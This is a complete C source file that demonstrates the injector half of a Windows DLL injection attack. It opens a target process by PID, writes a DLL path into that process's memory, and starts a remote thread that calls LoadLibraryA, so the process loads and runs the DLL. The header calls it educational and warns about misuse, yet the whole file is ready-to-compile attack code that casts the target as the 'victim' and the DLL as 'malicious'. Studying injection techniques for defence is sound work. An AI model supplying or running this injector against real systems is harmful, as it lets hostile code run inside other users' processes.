/*
Name:
injector.c - demonstration for the injector part of the DLL injection attack.

To Compile with GCC:
gcc -o injector.exe injector.c

Description:
When executed, the code injects a DLL to another process on the computer. It means that process will load and run the DLL.
the injector must be run from a cmd, and the PID of the process to inject is received as argument from terminal.
The path to the DLL file that sould be injected is stored as constant value - change it based on the DLL you would like to inject.

WARNING:
A person may use this injector to perform a true DLL injection attack (inject a malicious DLL, and make a victim process to create that DLL). 
Be careful using this code, and take responsibility for your actions. This code is published for learning purposes only, any unethical use of it is your responsibility only and considered a cyber crime!
*/

#include <stdio.h>
#include <string.h>
#include <windows.h>

// constants
#define DLL_PATH "my_dll.dll"

int main(int argc, char* argv[])
{
	int dll_path_length = strlen(DLL_PATH) + 1;

	// check if an argument (PID number) was given.
	if (argc!=2)
	{
		printf("\nno pid detected - run from cmd and give a PID as argument!\n");
		return -1;
	}

	// transform the PID received as argument from string to integer (type DWORD).
	DWORD victim_process_pid;
	victim_process_pid = (DWORD)atoi(argv[1]);
	printf("\ninjecting the malicious dll to process: %d (pid)\n", victim_process_pid);

	// getting a handle with the right access to the victim process.
	HANDLE victim_process_handle = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD, FALSE, victim_process_pid);
	if (victim_process_handle == NULL || victim_process_handle == INVALID_HANDLE_VALUE)
	{
		printf("\ncould not get a handle for the process - attack failed.\nError code: %d\n", GetLastError());
		return -1;
	}

	printf("got a handle for the process, starting the attack.\n");

	// create a buffer in the memory of the victim process, for writing the DLL's path to it.
	LPVOID dll_path_buffer = VirtualAllocEx(victim_process_handle, NULL, dll_path_length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (dll_path_buffer == NULL)
	{
		printf("\ncould not create a buffer for the dll path in the victim process' memory - attack failed.\nError code: %d\n", GetLastError());
		return -1;
	}

	// writing the dll path to the allocated buffer in the victim process' memory.
	int success = WriteProcessMemory(victim_process_handle, dll_path_buffer, DLL_PATH, dll_path_length, NULL);
	if (success == 0)
	{
		printf("\ncould not write the dll path into the victim process' memory - attack failed.\nError code: %d\n", GetLastError());
		return -1;
	}

	// get a handle to the kernel32.dll module.
	HMODULE kernel32_handle = GetModuleHandleA("Kernel32.dll");
	if (kernel32_handle == NULL || kernel32_handle == INVALID_HANDLE_VALUE)
	{
		printf("\ncould not get a handle over Kernel32.dll - attack failed.\nError code: %d\n", GetLastError());
		return -1;
	}

	// find the LoadLibraryA function in the memory of the kernel32.dll, using the handle we received to the module.
	// we need the function for making the victim process load the DLL to his memory, which is the core of the attack.
	LPTHREAD_START_ROUTINE loadlibrary_pointer = (LPTHREAD_START_ROUTINE)GetProcAddress(kernel32_handle, "LoadLibraryA");
	if (loadlibrary_pointer == NULL)
	{
		printf("\ncould not find LoadLibraryA in the memory - attack failed.\nError code: %d\n", GetLastError());
		return -1;
	}
	// create a new threaed in the victim process, that will load and run the malicious DLL.
	// the thread does that by calling LoadLibraryA (that's why we searched it in the kernel32.dll memory), and giving the DLL path as argument (that's why we wrote it to a buffer in the victim process)
	// this is the injection of the DLL to the victim process memory.
	HANDLE malicious_thread = CreateRemoteThread(victim_process_handle, NULL, 0, loadlibrary_pointer, dll_path_buffer, 0, NULL);
	
	// check if the thread loading the DLL was truly created or not. the attack is successful only if the thread was created.
	if (malicious_thread == NULL)
	{
		printf("\ncould not create a remote thread in the victim process - attack failed.\nError code: %d\n", GetLastError());
		return -1;
	}

	// if got here, it means the thread was successfully created and the DLL is loaded to the victim process memory - great for us, bad for the victim process.
	printf("\nSuccessfully injected the DLL to the victim process!\n");
	return 0;
}
